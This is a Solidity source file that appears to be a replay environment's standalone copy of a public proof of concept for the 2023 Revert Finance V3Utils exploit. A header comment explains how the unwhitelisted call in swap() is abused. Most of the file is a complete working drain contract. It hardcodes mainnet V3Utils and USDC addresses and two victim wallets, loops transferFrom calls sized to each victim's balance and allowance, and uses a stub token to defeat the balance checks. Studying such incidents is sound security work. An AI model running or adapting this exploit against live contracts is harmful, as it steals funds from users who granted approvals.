// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-02-RevertFinance).
// Faithful copy of `ContractTest.testExploit()` from
// evm-hack-registry/2023-02-RevertFinance_exp/test/RevertFinance_exp.sol, with
// the attack moved into a standalone `run()` entrypoint on its own contract
// (the original test runs the whole attack INLINE — `address(this)` is both
// the caller of V3Utils.swap() AND the fake `tokenIn`/`tokenOut` stub whose
// transferFrom/balanceOf/approve/transfer the contract itself implements;
// there is no separate exploit contract to deploy in the original PoC). No
// imports — a minimal interface is inlined so this compiles anywhere.
//
// Root cause (unchanged from the original): Revert Finance's `V3Utils`
// (0x531110418d8591C92e9cBBFC722Db8FFb604FAFD) is an ownerless helper that
// users grant ERC20 allowances to so it can manage their Uniswap V3
// positions. Its public `swap(SwapParams)` decodes a caller-supplied
// `swapData` blob into `(swapRouter, allowanceTarget, data)` and executes
// `swapRouter.call(data)` with ZERO whitelist on `swapRouter` and zero shape
// check on `data`. The attacker sets `tokenIn = tokenOut = address(this)`
// (a stub contract whose balanceOf/transferFrom/approve/transfer always
// "succeed" with a constant), so V3Utils's fee-on-transfer guard and its
// post-swap balance-delta accounting are both fooled into seeing zero
// change. Meanwhile `swapRouter` is pointed at the REAL USDC token and
// `data` is `USDC.transferFrom(victim, attacker, amount)` — since V3Utils is
// `msg.sender` to USDC and holds a live allowance from the victim (granted
// so V3Utils could manage their position), the transfer succeeds and the
// victim's USDC moves straight to the attacker. Looping this over every
// address that ever approved V3Utils drains each one for
// min(balance, allowance).

interface IERC20Min {
    function balanceOf(address) external view returns (uint256);
    function allowance(address, address) external view returns (uint256);
}

interface IV3Utils {
    struct SwapParams {
        address tokenIn;
        address tokenOut;
        uint256 amountIn;
        uint256 minAmountOut;
        address recipient; // recipient of tokenOut and leftover tokenIn (if any leftover)
        bytes swapData;
        bool unwrap; // if tokenIn or tokenOut is WETH - unwrap
    }

    function swap(
        SwapParams calldata params
    ) external;
}

contract RevertFinanceDrain {
    IV3Utils internal constant UTILS = IV3Utils(0x531110418d8591C92e9cBBFC722Db8FFb604FAFD);
    IERC20Min internal constant USDC = IERC20Min(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    address[2] internal victims = [0x067D0F9089743271058D4Bf2a1a29f4E9C6fdd1b, 0x4107A0A4a50AC2c4cc8C5a3954Bc01ff134506b2];
    uint256 internal counter;

    function run() external {
        for (uint256 i; i < victims.length; ++i) {
            address victim = victims[i];
            uint256 transferAmount = USDC.balanceOf(victim);
            uint256 allowed = USDC.allowance(victim, address(UTILS));
            if (allowed < transferAmount) {
                transferAmount = allowed;
                if (transferAmount == 0) continue;
            }

            bytes memory data =
                abi.encodeWithSignature("transferFrom(address,address,uint256)", victim, address(this), transferAmount);
            bytes memory swapdata = abi.encode(address(USDC), address(this), data);

            IV3Utils.SwapParams memory params = IV3Utils.SwapParams({
                tokenIn: address(this),
                tokenOut: address(this),
                amountIn: 1,
                minAmountOut: 0,
                recipient: address(this),
                swapData: swapdata,
                unwrap: false
            });

            UTILS.swap(params);
            counter--;
        }
    }

    // --- stub ERC20 the attacker points V3Utils's tokenIn/tokenOut at ---

    function transferFrom(address, address, uint256) external returns (bool) {
        counter++;
        return true;
    }

    function approve(address, uint256) external returns (bool) {
        return true;
    }

    function transfer(address, uint256) external returns (bool) {
        return true;
    }

    function balanceOf(
        address
    ) external view returns (uint256) {
        if (counter == 1) return 1;
        else return 0;
    }
}
